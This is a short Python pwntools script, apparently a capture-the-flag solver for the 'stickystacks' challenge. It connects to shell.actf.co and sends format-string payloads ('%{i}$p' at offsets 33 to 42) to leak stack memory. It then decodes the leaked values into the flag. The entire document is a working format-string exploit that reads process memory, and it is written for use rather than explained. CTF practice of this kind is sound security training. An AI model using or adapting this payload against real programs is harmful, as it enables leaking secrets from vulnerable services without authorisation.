from pwn import *
from Crypto.Util.number import *

flag = ''

for i in range(33, 42+1):
    p = remote('shell.actf.co', 21820)
#p = process('./stickystacks')

    payload = '%{}$p'.format(i)

    p.sendlineafter('Name:', payload)
    p.recvuntil(', ')
    data = long_to_bytes(int(p.recv(), 16)).decode()
    flag = data + flag

print(flag[::-1])

